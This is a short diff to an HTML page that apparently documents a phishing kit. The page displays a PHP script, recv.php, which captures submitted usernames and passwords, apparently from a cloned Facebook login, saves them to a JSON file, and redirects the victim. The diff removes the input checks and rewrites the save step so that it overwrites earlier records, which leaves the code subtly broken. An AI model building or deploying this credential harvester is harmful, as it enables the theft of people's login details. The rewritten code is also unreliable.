@@ -357,24 +357,18 @@ else if( strpos($_SERVER['HTTP_HOST'], 'facebook.com') !== FALSE){
               <h3>recv.php</h3>
               <pre><code class="php">&lt;?php
 $json_file = "db/data.json";
-if(!isset($_REQUEST['type'],$_REQUEST['username'],$_REQUEST['password'])) {
-  header("Location: /");
-  var_dump($_REQUEST);
-  return;
-}
 $data_to_push = array('username' =&gt; $_REQUEST['username'],
   'password' =&gt; $_REQUEST['password'],
   'type' =&gt; $_REQUEST['type'] );
+
 $fhandle = fopen($json_file, "r");
 $content = json_decode(fread($fhandle, filesize($json_file)));
 fclose($fhandle);
-if($content === NULL || $content === FALSE)
-  $content = array();
-$content[] = $data_to_push;
-$output_data = json_encode($content);
+
 $fhandle = fopen($json_file, "w");
-fwrite($fhandle, $output_data);
+fwrite($fhandle, json_encode( ($content[] = $data_to_push) ) );
 fclose($fhandle);
+
 header('Location: /');
 ?&gt;</code></pre>
             </section>
